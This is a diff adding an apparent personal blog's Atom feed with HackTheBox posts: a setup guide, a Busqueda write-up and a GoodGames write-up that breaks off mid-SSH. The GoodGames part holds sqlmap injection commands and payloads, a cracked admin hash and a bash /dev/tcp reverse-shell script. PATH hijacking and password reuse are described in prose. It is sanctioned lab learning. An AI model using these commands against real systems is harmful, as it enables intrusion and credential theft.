@@ -1,0 +1,667 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-13T13:56:17-07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">soh3ee</title><entry><title type="html">getting started with HackTheBox</title><link href="http://localhost:4000/hacking/getting-started-with-hackthebox" rel="alternate" type="text/html" title="getting started with HackTheBox" /><published>2023-07-12T11:57:00-07:00</published><updated>2023-07-12T11:57:00-07:00</updated><id>http://localhost:4000/hacking/getting-started-with-hackthebox</id><content type="html" xml:base="http://localhost:4000/hacking/getting-started-with-hackthebox"><![CDATA[<h2 id="connecting-to-starting-point">Connecting to “Starting Point”</h2>
+
+<p>To preface, all this should be completed on the machine you want to “hack” with. For most, this will be your Kali VM.</p>
+
+<p>First, create a HackTheBox Labs account. HackTheBox has a variety of accounts for its different divisions.
+<img src="/_assets/images/hacking/gettingStartedWithHackTheBox/img1.png" alt="" /></p>
+
+<p>Navigate to Starting Point on the left tab.
+<img src="/_assets/images/hacking/gettingStartedWithHackTheBox/img9.png" alt="" /></p>
+
+<p>From this interface, we can spawn Starting Point machines and answer questions. But before that, we need to be able to access their machines. We can do this by remotely connecting to their network through a VPN (Virtual Private Network).
+<img src="/_assets/images/hacking/gettingStartedWithHackTheBox/img3.png" alt="" /></p>
+
+<p>To install your VPN configuration file, click on “Connect to Ovpn”, keep the default configuration options, and click “Download VPN”.
+<img src="/_assets/images/hacking/gettingStartedWithHackTheBox/img10.png" alt="" /></p>
+
+<p>Your configuration file should have been downloaded to your <code class="language-plaintext highlighter-rouge">~/Downloads</code> directory.
+<img src="/_assets/images/hacking/gettingStartedWithHackTheBox/img5.png" alt="" /></p>
+
+<p>Now, in order to use this oVPN file, we use a binary called <code class="language-plaintext highlighter-rouge">openvpn</code>. The syntax for connecting with a file is: <code class="language-plaintext highlighter-rouge">sudo openvpn &lt;configuration_file&gt;.ovpn</code>
+<img src="/_assets/images/hacking/gettingStartedWithHackTheBox/img6.png" alt="" /></p>
+
+<h2 id="spawning-a-machine">Spawning a Machine</h2>
+
+<p>Spawning a machine on our end means that we are turning on a machine on HackTheBox’s end for us to connect to.</p>
+
+<p>Simply click the button that says “Spawn Machine”.
+<img src="/_assets/images/hacking/gettingStartedWithHackTheBox/img7.png" alt="" /></p>
+
+<p>After it fully initializes our machine, we should be able to interact with it. Verify this by trying to ping the IP address of the machine.</p>
+
+<p>![[Pasted image 20230712154336.png]]
+<img src="/_assets/images/hacking/gettingStartedWithHackTheBox/img8.png" alt="" /></p>
+
+<p>And success!</p>]]></content><author><name>soh3ee</name></author><category term="hacking" /><summary type="html"><![CDATA[Connecting to “Starting Point”]]></summary></entry><entry><title type="html">Busqueda Writeup</title><link href="http://localhost:4000/writeups/busqueda" rel="alternate" type="text/html" title="Busqueda Writeup" /><published>2023-06-06T11:57:00-07:00</published><updated>2023-06-06T11:57:00-07:00</updated><id>http://localhost:4000/writeups/busqueda</id><content type="html" xml:base="http://localhost:4000/writeups/busqueda"><![CDATA[<p>Busqueda was an Easy Linux machine featuring a vulnerable version of a web application, following with an enjoyable privilege escalation journey. Initial access led to credential exposure of our user. We used this to expose a script we could run as <code class="language-plaintext highlighter-rouge">sudo</code>, which consisted of light code review and eventually path hijacking to obtain <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<h2 id="tcp-nmap-scan">TCP Nmap Scan</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.94 scan initiated Wed Jul  5 12:54:30 2023 as: nmap -p- -o nmap.txt 10.10.11.208</span>
+Nmap scan report <span class="k">for </span>10.10.11.208
+Host is up <span class="o">(</span>0.081s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+<span class="c"># Nmap done at Wed Jul  5 12:55:37 2023 -- 1 IP address (1 host up) scanned in 67.65 seconds</span>
+</code></pre></div></div>
+
+<h2 id="initial-access">Initial Access</h2>
+<p>Before I could even do a verbose scan (<code class="language-plaintext highlighter-rouge">nmap -sCV ...</code>), I visited the website at <code class="language-plaintext highlighter-rouge">searcher.htb</code> since the IP auto-redirected to the domain which I put into my <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<p><img src="/_assets/images/writeups/busqueda/screenshot3.png" alt="" class="img" /></p>
+
+<p>Although I initially messed around with the features of the site which essentially allowed you to select a search engine and make searches through it, what caught my eye was that it was running on Flask and a specific web application called Searchor. They had also kindly provided the version number. With this information I was able to search for <code class="language-plaintext highlighter-rouge">Searchor exploit github</code>, where I landed on this <a href="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection">POC Python exploit</a>. Surely enough, the version applicability lined up and I ran the exploit in order to receive a reverse shell:</p>
+
+<p><img src="/_assets/images/writeups/busqueda/screenshot5.png" alt="" /></p>
+
+<h2 id="vhost-discovery">VHost Discovery</h2>
+<p>I landed in <code class="language-plaintext highlighter-rouge">/var/www/app</code> which is where the website was being hosted. Looking more closely, I found a <code class="language-plaintext highlighter-rouge">.git</code>
+directory. In the <code class="language-plaintext highlighter-rouge">config</code> file, I found some creds, as well as the virtual host <code class="language-plaintext highlighter-rouge">gitea.searcher.htb</code>.</p>
+
+<p><img src="/_assets/images/writeups/busqueda/screenshot4.png" alt="" /></p>
+
+<p>I added <code class="language-plaintext highlighter-rouge">gitea.searcher.htb</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> in order to access the site being hosted there. At the site, I’m greeted with <code class="language-plaintext highlighter-rouge">gitea</code>, a self-hosted Git server. I was able to successfully login as <code class="language-plaintext highlighter-rouge">cody</code> here:</p>
+
+<p><img src="/_assets/images/writeups/busqueda/screenshot6.png" alt="" /></p>
+
+<p>I wasn’t able to find anything significant, and I was pretty confident that the files in the <code class="language-plaintext highlighter-rouge">.git</code> directory were synced with the site, therefore I decided to pivot and look around more.</p>
+
+<p>Although the password I found in the git config file is for a user named <code class="language-plaintext highlighter-rouge">cody</code>, password reuse is common and is also present in boxes. Therefore, when I find a password, I like to try them with all the users I have. Since one of the things on my privilege escalation checklist is to check for forbidden and permitted commands for my user with <code class="language-plaintext highlighter-rouge">sudo -l</code>, I tried authenticating with <code class="language-plaintext highlighter-rouge">cody</code>’s password’:</p>
+
+<p><img src="/_assets/images/writeups/busqueda/screenshot7.png" alt="" /></p>
+
+<p>Despite the password corresponding with user <code class="language-plaintext highlighter-rouge">cody</code>, I was able to successfully authenticate as user <code class="language-plaintext highlighter-rouge">svc</code> with the discovered password.</p>
+
+<h2 id="docker-script">Docker Script</h2>
+<p>With the output of <code class="language-plaintext highlighter-rouge">sudo -l</code>, I discovered that I was able to run <code class="language-plaintext highlighter-rouge">/usr/bin/python3 /opt/scripts/system-checkup.py *</code>.
+Running the script as <code class="language-plaintext highlighter-rouge">sudo</code> showed the following:</p>
+
+<p><img src="/_assets/images/writeups/busqueda/screenshot2.png" alt="" /></p>
+
+<p>I try messing with all the options, and I notice that <code class="language-plaintext highlighter-rouge">full-checkup</code> returns <code class="language-plaintext highlighter-rouge">something went wrong</code> no matter the input. I leave it for the moment while I look at the other options.</p>
+
+<p><img src="/_assets/images/writeups/busqueda/screenshot1.png" alt="" /></p>
+
+<p>After doing some research, I discovered that <code class="language-plaintext highlighter-rouge">docker-inspect</code> was likely in reference to the actual <code class="language-plaintext highlighter-rouge">docker inspect</code> command, which returns a set of specified information on a container. The option <code class="language-plaintext highlighter-rouge">docker-inspect</code> expected a specified <code class="language-plaintext highlighter-rouge">format</code> as well as a <code class="language-plaintext highlighter-rouge">container_name</code>. While the names of the 2 existing containers could be found by running <code class="language-plaintext highlighter-rouge">docker-ps</code>, the list of <code class="language-plaintext highlighter-rouge">formats</code> required looking at <code class="language-plaintext highlighter-rouge">docker</code>’s documentation for the command. To confirm that these were the <code class="language-plaintext highlighter-rouge">formats</code> that the script was expecting, I tested a format that would return the IP address of the container:</p>
+
+<p><img src="/_assets/images/writeups/busqueda/screenshot8.png" alt="" /></p>
+
+<p>Success :) So with the <code class="language-plaintext highlighter-rouge">docker-inspect</code> option, I could obtain information on the container… but what information could I even extract? I wasn’t too familiar with the formatting, so I searched up some examples. One of the prominent examples I found was a format that specified environment variables:</p>
+
+<p><img src="/_assets/images/writeups/busqueda/screenshot9.png" alt="" /></p>
+
+<p>Boom, creds B) Not just one password, but two ![[Pasted image 20230705202226.png]]</p>
+
+<p>I attempted logging into the <code class="language-plaintext highlighter-rouge">gitea</code> panel as <code class="language-plaintext highlighter-rouge">administrator</code>, as it was the only other user on the <code class="language-plaintext highlighter-rouge">gitea</code> panel besides <code class="language-plaintext highlighter-rouge">cody</code>:</p>
+
+<p><img src="/_assets/images/writeups/busqueda/screenshot10.png" alt="" /></p>
+
+<p>Hey look, a <code class="language-plaintext highlighter-rouge">scripts</code> repository, the same name as the directory where <code class="language-plaintext highlighter-rouge">system-checkup.py</code> is located. Looking at the directory, I find the source code to the scripts.</p>
+
+<p><img src="/_assets/images/writeups/busqueda/screenshot11.png" alt="" /></p>
+
+<p>Darn, a rookie error! When the option <code class="language-plaintext highlighter-rouge">full-checkup</code> is passed, <code class="language-plaintext highlighter-rouge">system-checkup.py</code> calls the script by relative path. Unfortunately, well, fortunately for me, when relative paths are used, the system searches it’s <code class="language-plaintext highlighter-rouge">PATH</code> variable first, and then the local directory. Since the script is running as <code class="language-plaintext highlighter-rouge">root</code>, it will call <code class="language-plaintext highlighter-rouge">full-checkup.sh</code> as <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
+
+    <span class="k">elif</span> <span class="n">action</span> <span class="o">==</span> <span class="s">'full-checkup'</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">arg_list</span> <span class="o">=</span> <span class="p">[</span><span class="s">'./full-checkup.sh'</span><span class="p">]</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">run_command</span><span class="p">(</span><span class="n">arg_list</span><span class="p">))</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">'[+] Done!'</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">'Something went wrong'</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="p">...</span>
+</code></pre></div></div>
+
+<p>Essentially, I can run anything I want as root by:</p>
+<ol>
+  <li>creating my own <code class="language-plaintext highlighter-rouge">full-checkup.sh</code> script</li>
+  <li>exporting a new <code class="language-plaintext highlighter-rouge">PATH</code> location that contains my <code class="language-plaintext highlighter-rouge">full-checkup.sh</code> payload</li>
+  <li>running <code class="language-plaintext highlighter-rouge">system-checkup.py</code> and using the <code class="language-plaintext highlighter-rouge">full-checkup</code> option that will call my payload script rather than the local <code class="language-plaintext highlighter-rouge">.full-checkup.sh</code> script</li>
+</ol>
+
+<p><img src="/_assets/images/writeups/busqueda/screenshot15.png" alt="" /></p>]]></content><author><name>soh3ee</name></author><category term="writeups" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">GoodGames Writeup</title><link href="http://localhost:4000/writeups/goodgames" rel="alternate" type="text/html" title="GoodGames Writeup" /><published>2023-03-24T07:44:00-07:00</published><updated>2023-03-24T07:44:00-07:00</updated><id>http://localhost:4000/writeups/goodgames</id><content type="html" xml:base="http://localhost:4000/writeups/goodgames"><![CDATA[<p>GoodGames was an easy rated box featuring a login page that called unsanitized queries and server side template injection (SSTI). I feel like this box reinforces your fundamentals such as using automated tooling like SQLmap, being weary of any data entry fields, and a touch into the concept of containers (I had never escaped one before this box!).</p>
+<h2 id="tcp-nmap-scan">TCP Nmap Scan</h2>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">o</span> <span class="n">goodgames</span><span class="p">.</span><span class="n">txt</span> <span class="c1">--min-rate=10000 10.10.11.130</span>
+<span class="n">Warning</span><span class="p">:</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">130</span> <span class="n">giving</span> <span class="n">up</span> <span class="n">on</span> <span class="n">port</span> <span class="n">because</span> <span class="n">retransmission</span> <span class="n">cap</span> <span class="n">hit</span> <span class="p">(</span><span class="mi">10</span><span class="p">).</span>
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">130</span>
+<span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">086</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">64418</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">1116</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">http</span>    <span class="n">Apache</span> <span class="n">httpd</span> <span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">51</span>
+<span class="err">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">GoodGames</span> <span class="err">|</span> <span class="n">Community</span> <span class="ow">and</span> <span class="n">Store</span>
+<span class="err">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Werkzeug</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">2</span> <span class="n">Python</span><span class="o">/</span><span class="mi">3</span><span class="p">.</span><span class="mi">9</span><span class="p">.</span><span class="mi">2</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">goodgames</span><span class="p">.</span><span class="n">htb</span>
+
+<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="p">.</span>
+<span class="o">#</span> <span class="n">Nmap</span> <span class="n">done</span> <span class="n">at</span> <span class="n">Tue</span> <span class="n">Mar</span> <span class="mi">21</span> <span class="mi">15</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">24</span> <span class="mi">2023</span> <span class="c1">-- 1 IP address (1 host up) scanned in 27.49 seconds</span>
+</code></pre></div></div>
+<p>I added <code class="language-plaintext highlighter-rouge">goodgames.htb</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<p>I noticed that there was some information about the technology the site was using: <code class="language-plaintext highlighter-rouge">Werkezeug/2.0.2 Python/3.9.2</code>. <code class="language-plaintext highlighter-rouge">Werkzeug</code> caught my eyes– I searched up “Werkzeug 2.0.2 exploits”. HackTricks said that if debug is enabled, there could be a URI to the console with <code class="language-plaintext highlighter-rouge">/console</code>. When I read that, I thought it would be my initial access, but unfortunately I just got a 404 error X_X.</p>
+
+<p>Moving on, I tried clicking around the site and analyzed the requests that the site was sending with Burpsuite. I looked at the requests and replies, but nothing really caught my eye. Eventually, I saw myself back at the login page, in which I came to my last resort: SQL injection. I used <code class="language-plaintext highlighter-rouge">burpsuite</code> to confirm the URI path and data parameters:</p>
+
+<p><img src="/_assets/images/writeups/goodgames/burpsuite.png" alt="" /></p>
+
+<h3 id="sqlmap-payload">Sqlmap Payload</h3>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s1">'http://goodgames.htb/login'</span> <span class="nt">--data</span><span class="o">=</span><span class="s2">"email=test@gmail.com&amp;password=test"</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">-f</span> <span class="nt">--banner</span> │ <span class="nt">--ignore-code</span> 401
+</code></pre></div></div>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sqlmap</span> <span class="n">identified</span> <span class="n">the</span> <span class="k">following</span> <span class="n">injection</span> <span class="n">point</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">with</span> <span class="n">a</span> <span class="n">total</span> <span class="k">of</span> <span class="mi">235</span> <span class="n">HTTP</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">requests</span><span class="p">:</span>
+<span class="c1">---</span>
+<span class="k">Parameter</span><span class="p">:</span> <span class="n">email</span> <span class="p">(</span><span class="n">POST</span><span class="p">)</span>
+    <span class="k">Type</span><span class="p">:</span> <span class="nb">boolean</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
+    <span class="n">Title</span><span class="p">:</span> <span class="k">OR</span> <span class="nb">boolean</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span> <span class="o">-</span> <span class="k">WHERE</span> <span class="k">or</span> <span class="k">HAVING</span> <span class="n">clause</span> <span class="p">(</span><span class="k">NOT</span><span class="p">)</span>
+    <span class="n">Payload</span><span class="p">:</span> <span class="n">email</span><span class="o">=</span><span class="n">test</span><span class="o">@</span><span class="n">gmail</span><span class="p">.</span><span class="n">com</span><span class="s1">' OR NOT 9443=9443-- ivUO&amp;password=test
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=test@gmail.com'</span> <span class="k">AND</span> <span class="p">(</span><span class="k">SELECT</span> <span class="mi">7414</span> <span class="k">FROM</span> <span class="p">(</span><span class="k">SELECT</span><span class="p">(</span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)))</span><span class="n">yOWp</span><span class="p">)</span><span class="c1">-- sdlr&amp;password=test</span>
+
+    <span class="k">Type</span><span class="p">:</span> <span class="k">UNION</span> <span class="n">query</span>
+    <span class="n">Title</span><span class="p">:</span> <span class="n">Generic</span> <span class="k">UNION</span> <span class="n">query</span> <span class="p">(</span><span class="k">NULL</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="n">columns</span>
+    <span class="n">Payload</span><span class="p">:</span> <span class="n">email</span><span class="o">=</span><span class="n">test</span><span class="o">@</span><span class="n">gmail</span><span class="p">.</span><span class="n">com</span><span class="s1">' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a787071,0x4e5a62544f6d427a58487362544646664f4e766361584b755948474e6a63426d494f474b744c736d,0x716b707171)-- -&amp;password=test
+---
+[21:45:25] [INFO] testing MySQL
+[21:45:26] [INFO] confirming MySQL
+[21:45:26] [INFO] the back-end DBMS is MySQL
+[21:45:26] [INFO] fetching banner
+[21:45:27] [INFO] executing MySQL comment injection fingerprint
+back-end DBMS: active fingerprint: MySQL &gt;= 8.0.0
+               comment injection fingerprint: MySQL 8.0.27
+banner: '</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">27</span><span class="s1">'
+[21:45:27] [INFO] fetched data logged to text files under '</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sohee</span><span class="o">/</span><span class="p">.</span><span class="k">local</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">sqlmap</span><span class="o">/</span><span class="k">output</span><span class="o">/</span><span class="n">goodgames</span><span class="p">.</span><span class="n">htb</span><span class="s1">'
+
+[*] ending @ 21:45:27 /2023-03-22/
+
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">sqlmap</code> attack was successful. To then access the database, I passed the <code class="language-plaintext highlighter-rouge">--dump</code> flag to the same command like so:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s1">'http://goodgames.htb/login'</span> <span class="nt">--data</span><span class="o">=</span><span class="s2">"email=test@gmail.com&amp;password=test"</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">-f</span> <span class="nt">--banner</span> │ <span class="nt">--ignore-code</span> 401 <span class="nt">--dump</span>
+</code></pre></div></div>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Database</span><span class="p">:</span> <span class="n">main</span>
+<span class="k">Table</span><span class="p">:</span> <span class="k">user</span>
+<span class="p">[</span><span class="mi">1</span> <span class="n">entry</span><span class="p">]</span>
+<span class="o">+</span><span class="c1">----+-------+---------------------+----------------------------------+</span>
+<span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">name</span>  <span class="o">|</span> <span class="n">email</span>               <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+-------+---------------------+----------------------------------+</span>
+<span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span> <span class="o">|</span> <span class="k">admin</span><span class="o">@</span><span class="n">goodgames</span><span class="p">.</span><span class="n">htb</span> <span class="o">|</span> <span class="mi">2</span><span class="n">b22337f218b2d82dfc3b6f77e7cb8ec</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+-------+---------------------+----------------------------------+</span>
+</code></pre></div></div>
+<p>Creds &lt;3 But I noticed the password was hashed, although it was just a simple MD5 hash. One could pass this hash into a hash cracker like CyberChef and used the “Magic” option to discover the type of hash, but I was able to recognize it and passed it into Crackstation.</p>
+
+<p><img src="/_assets/images/writeups/goodgames/crackstation.png" alt="" /></p>
+
+<h2 id="initial-access">Initial Access</h2>
+<p>Using these creds, I logged in to the login page I attacked. After clicking around the new portal, I noticed that one of the links (the gear icon) took me to a new vhost: <code class="language-plaintext highlighter-rouge">internal-administration.goodgames.htb</code>.</p>
+
+<p><img src="/_assets/images/writeups/goodgames/gearicon.png" alt="" /></p>
+
+<p><img src="/_assets/images/writeups/goodgames/vhost.png" alt="" /></p>
+
+<p>I added it to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and arrived at another login portal. The first thing I noticed was that this login portal expected different types of credentials. The previous one had been an email, but this one expected a username. Before doing any more deep diving, I tried the same credentials, but in the username, I removed the domain.</p>
+
+<p><img src="/_assets/images/writeups/goodgames/flasklogincreds.png" alt="" /></p>
+
+<h3 id="ssti-in-flaskjinja">SSTI in Flask/Jinja</h3>
+<p>More than specifically seeing any potential on this “General Information” page, I used process of elimination, as the other links or buttons had no meaningful action. 
+<em>I often look for keywords that hint at names of technologies and even their versions</em>
+On top of the fact that I could probably exploit the input boxes, I also saw “Flask Volt Dashboard” in the order of the page. So I searched: “Flask Volt Dashboard exploit”.</p>
+
+<p><img src="/_assets/images/writeups/goodgames/dashboard.png" alt="" /></p>
+
+<p>I came across this post: https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
+Reading this post made me understand that I could possibly exploit a template that directly called data from a database. Therefore rather than passing the expected data, in this case, a “Full Name”, I could pass data in Jinja’s syntax, that would execute as my payload.</p>
+
+<p>So I tried it:</p>
+
+<p><img src="/_assets/images/writeups/goodgames/flasklogincreds.png" alt="" /></p>
+
+<p>And wah-lah, it worked :P! After having POC (Proof of Concept), I used the following exploit to obtain RCE (Remote Code Execution), that would grab a file containing commands for a reverse shell from my attacking machine.</p>
+<ol>
+  <li>Configure the revshell executable to be grabbed:
+    <ul>
+      <li>Create a file called <code class="language-plaintext highlighter-rouge">revshell</code></li>
+      <li>Populate with:
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> #!/bin/bash
+ -c "bash -i &gt;&amp; /dev/tcp/10.10.14.22/6666 0&gt;&amp;1"
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>Set up the listener: <code class="language-plaintext highlighter-rouge">nc -lvnp 6666</code></li>
+  <li>Set up the web server: <code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code></li>
+  <li>Submit the request with the payload as the “Full Name”: ``</li>
+</ol>
+
+<p>And there was my shell! But ew, what the fudge, it looks like I’m in a container ):</p>
+
+<p><img src="/_assets/images/writeups/goodgames/container.png" alt="" /></p>
+
+<h3 id="escaping-the-container">Escaping the Container</h3>
+<p>The first thing I did was look around the container. I had landed in <code class="language-plaintext highlighter-rouge">/backend/</code> when I initiated the shell. I looked around but never found anything actually important.</p>
+
+<p>I then progressed to <code class="language-plaintext highlighter-rouge">linpeas</code>. Although it wasn’t highlighted, I notice that there was a user in the home directory?!</p>
+
+<p><img src="/_assets/images/writeups/goodgames/augustus.png" alt="" /></p>
+
+<p>I was able to read <code class="language-plaintext highlighter-rouge">user.txt</code>, but the thing I was more concerned about was how <code class="language-plaintext highlighter-rouge">/home/augustus</code> existed without being a defined uesr in <code class="language-plaintext highlighter-rouge">/etc/passwd</code> <strong>in the container</strong>.
+<code class="language-plaintext highlighter-rouge">cat /etc/passwd</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+</code></pre></div></div>
+
+<p>After looking more into containers, I learned that host machines can mount their directories to the container. Although I couldn’t yet do anything with this information yet, it would come in handy down the line.</p>
+
+<p>This was my first time having to break out of a container, so Brice told me a bit of information regarding Docker containers and the connection between it and the host machine:
+    - The host machine behaves as a gateway between the docker container and itself, therefore the default gateway of the network is a vector in which we can communicate from the container to the host (using 172.19.0.1)</p>
+
+<p>Using this information, I imported an <code class="language-plaintext highlighter-rouge">nmap</code> binary from my host machine to the container and scanned the host machine. 
+<em>Make sure you are in a writeable directory, and to give the executable the correct permissions (<code class="language-plaintext highlighter-rouge">chmod +x</code>)</em>
+<code class="language-plaintext highlighter-rouge">./nmap -p- 172.19.0.1 --minrate=5000</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-23 07:49 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 172.19.0.1
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.000030s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 02:42:3B:D3:F2:F7 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 34.58 seconds
+</code></pre></div></div>
+
+<p>At this moment is when I should have put the three pieces together: I <strong>assumed</strong> user <code class="language-plaintext highlighter-rouge">augustus</code> existed on the host machine because it was <strong>likely</strong> mounted, as it did not appear to exist in <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, I had some creds, and <code class="language-plaintext highlighter-rouge">ssh</code> was open!</p>
+
+<p>After more useless rummaging on the container, I eventually said “what if I just try the same creds, but with the user <code class="language-plaintext highlighter-rouge">augustus</code>?</p>
+
+<p>And this is when I had my biggest takeway from this box. No matter how much you might think “there’s no way it’s the same creds AGAIN”, try, because you really never know.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh augustus@172.19.0.1
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+Host key verification failed.
+</code></pre></div></div>
+<p>LOL, you gotta get an interactive shell first x_x
+My usual go-to command for that is: <code class="language-plaintext highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
+Finally:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh augustus@172.19.0.1
+The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
